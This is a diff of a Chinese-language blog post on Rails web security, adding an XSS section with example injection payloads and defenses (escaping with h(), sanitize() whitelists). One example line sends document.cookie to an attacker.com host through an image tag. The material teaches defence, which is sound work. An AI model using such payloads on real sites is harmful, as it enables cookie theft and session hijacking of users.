@@ -1,20 +1,19 @@
 ---
 layout: post
 title: Web安全
-permalink: websecurity
+permalink: web-security
 ---
 
 Rails作为一个成熟的框架，已经默认提供了必要的安全机制，从而使得小白也能初始化出安全的站点。但安全还在人心，
 只有在开发中时刻注意，才不会留下漏洞。
+
+一定要对网站的入口慎之又慎，不要理所当然用户会按照你的设计去进行输入！
 
 # Sessions
 
 > HTTP is a stateless protocol. Sessions make it stateful.
 
 Session机制是为了解决web的无状态特性，通过浏览器回传cookies来确认当前的session。
-
-# Cross-Site Scripting (XSS)
-跨站执行脚本，等于别人可以在你的网站页面上写自己的代码。十分恐怖！
 
 
 # Cross-Site Request Forgery (CSRF)
@@ -41,8 +40,44 @@ protect_from_forgery with: :exception
 
 然后在最顶层的layout文件的head中加入：
 
-```html
+```
 <%= csrf_meta_tags %>
+```
+
+# Cross-Site Scripting (XSS)
+跨站执行脚本，等于别人可以在你的网站页面上写自己的代码。十分恐怖！
+
+流程：黑客注入代码，网站保存，受害者打开网站执行代码。
+
+## HTML/JavaScript 注入
+
+```html
+<script>alert('Hello');</script>
+
+<img src=javascript:alert('Hello')>
+<table background="javascript:alert('Hello')">
+
+
+<script>document.write(document.cookie);</script>
+<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
+
+```
+
+## 防御
+
+使用escapeHTML()或它的alias h()对二次显示的输入内存进行转义，这样
+字符&,",<,>就变成了&amp;,&quot;&lt;和&rl;了。
+
+能被浏览器还原，但是不能执行。
+
+但是有时确实需要让用户输入带标签的文本啊！
+
+使用[sanitize()](http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html)，
+它只运行白名单里的tag和attributes显示：
+
+```rb
+tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
+s = sanitize(user_input, tags: tags, attributes: %w(href title))
 ```
 
 # Redirection
@@ -50,6 +85,9 @@ protect_from_forgery with: :exception
 # File Upload/Download
 
 上传下载时，对文件名进行过滤，保证其安分呆在指定的目录里。
+
+# SQL 注入
+
 
 # 参考
 * http://guides.rubyonrails.org/security.html
